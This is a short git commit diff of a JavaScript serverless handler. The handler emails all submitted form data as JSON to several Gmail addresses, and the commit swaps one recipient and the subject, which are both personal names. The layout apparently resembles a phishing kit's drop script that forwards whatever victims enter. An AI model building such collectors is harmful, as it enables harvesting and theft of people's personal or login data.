ff79f6eead2a57c09f20a902ba0dd16452d739f0
zm9807350 <zm9807350@gmail.com>
2026-06-10 08:34:16 +0500

    Update and rename Rahal.js to varis.js

--- varis.js
+++ varis.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,rehannizamani303@gmail.com",
-      subject: "Rahal",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,nizamaniwarisniz@gmail.com",
+      subject: "Abdul-Waris",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
